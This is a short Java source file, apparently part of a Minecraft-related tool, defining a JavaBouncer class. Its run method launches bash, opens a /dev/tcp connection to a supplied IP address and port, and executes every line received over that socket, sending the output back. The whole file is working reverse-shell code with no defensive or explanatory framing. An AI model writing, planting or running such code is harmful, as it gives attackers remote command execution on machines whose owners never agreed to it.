package tech.dsstudio.minecraft.shell.bouncer;

import java.io.IOException;

public class JavaBouncer extends Bouncer {
	public JavaBouncer(String ip, String port) {
		super(ip, port);
	}

	@Override
	public void run() {
		Runtime r = Runtime.getRuntime();
		String[] cmd = { "/bin/bash",
				"-c",
				"exec 5<>/dev/tcp/" + ip + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done"
		};
		try {
			Process p = r.exec(cmd);
			p.waitFor();
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}
	}
}
